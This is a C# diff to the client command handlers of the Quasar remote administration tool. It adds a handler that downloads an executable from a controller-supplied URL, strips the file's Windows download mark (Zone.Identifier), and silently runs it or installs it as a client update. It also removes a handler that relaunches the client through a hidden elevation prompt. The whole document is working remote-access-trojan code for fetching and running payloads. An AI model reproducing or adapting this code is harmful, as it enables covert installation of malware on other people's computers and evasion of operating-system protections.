@@ -3,7 +3,9 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.NetworkInformation;
+using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using Quasar.Client.Config;
@@ -11,6 +13,7 @@ using Quasar.Client.Data;
 using Quasar.Client.Extensions;
 using Quasar.Client.IpGeoLocation;
 using Quasar.Client.Helper;
+using Quasar.Client.Setup;
 using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
 using Quasar.Common.Extensions;
@@ -407,31 +410,78 @@ namespace Quasar.Client.Commands
             client.Send(new GetProcessesResponse {Processes = processes});
         }
 
-        public static void HandleDoProcessStart(DoProcessStart command, Networking.Client client)
+        public static void HandleDoRemoteExecution(DoRemoteExecution command, Networking.Client client)
         {
-            if (string.IsNullOrEmpty(command.ApplicationName))
+            new Thread(() =>
             {
-                client.Send(new SetStatus {Message = "Process could not be started!"});
-                return;
-            }
+                string filePath = command.FilePath;
 
-            try
-            {
-                ProcessStartInfo startInfo = new ProcessStartInfo
+                if (string.IsNullOrEmpty(command.FilePath))
                 {
-                    UseShellExecute = true,
-                    FileName = command.ApplicationName
-                };
-                Process.Start(startInfo);
-            }
-            catch
-            {
-                client.Send(new SetStatus {Message = "Process could not be started!"});
-            }
-            finally
-            {
-                HandleGetProcesses(new GetProcesses(), client);
-            }
+                    if (string.IsNullOrEmpty(command.DownloadUrl))
+                    {
+                        client.Send(new DoRemoteExecutionResponse {Success = false});
+                        return;
+                    }
+
+                    filePath = FileHelper.GetTempFilePath(".exe");
+
+                    // download first
+                    try
+                    {
+                        using (WebClient c = new WebClient())
+                        {
+                            c.Proxy = null;
+                            c.DownloadFile(command.DownloadUrl, filePath);
+                        }
+
+                        FileHelper.DeleteZoneIdentifier(filePath);
+                    }
+                    catch
+                    {
+                        client.Send(new DoRemoteExecutionResponse {Success = false});
+                        NativeMethods.DeleteFile(filePath);
+                        return;
+                    }
+                }
+
+                try
+                {
+                    if (command.IsUpdate)
+                    {
+                        if (ClientUpdater.Update(client, filePath))
+                        {
+                            Program.ConnectClient.Exit();
+                        }
+                        else
+                        {
+                            throw new Exception("Update failed");
+                        }
+                    }
+                    else
+                    {
+                        var bytes = File.ReadAllBytes(filePath);
+                        if (!FileHelper.HasExecutableIdentifier(bytes))
+                            throw new Exception("no pe file");
+
+                        ProcessStartInfo startInfo = new ProcessStartInfo
+                        {
+                            UseShellExecute = true,
+                            FileName = filePath
+                        };
+                        Process.Start(startInfo);
+                    }
+                    client.Send(new DoRemoteExecutionResponse {Success = true});
+                }
+                catch
+                {
+                    client.Send(new DoRemoteExecutionResponse {Success = false});
+                }
+                finally
+                {
+                    HandleGetProcesses(new GetProcesses(), client);
+                }
+            }).Start();
         }
 
         public static void HandleDoProcessKill(DoProcessKill command, Networking.Client client)
@@ -449,38 +499,6 @@ namespace Quasar.Client.Commands
             }
         }
 
-        public static void HandleDoAskElevate(DoAskElevate command, Networking.Client client)
-        {
-            if (WindowsAccountHelper.GetAccountType() != "Admin")
-            {
-                ProcessStartInfo processStartInfo = new ProcessStartInfo
-                {
-                    FileName = "cmd",
-                    Verb = "runas",
-                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = true
-                };
-
-                MutexHelper.CloseMutex();  // close the mutex so our new process will run
-                try
-                {
-                    Process.Start(processStartInfo);
-                }
-                catch
-                {
-                    client.Send(new SetStatus {Message = "User refused the elevation request."});
-                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
-                    return;
-                }
-                Program.ConnectClient.Exit();
-            }
-            else
-            {
-                client.Send(new SetStatus {Message = "Process already elevated."});
-            }
-        }
-        
         public static void HandleDoShellExecute(DoShellExecute command, Networking.Client client)
         {
             string input = command.Command;
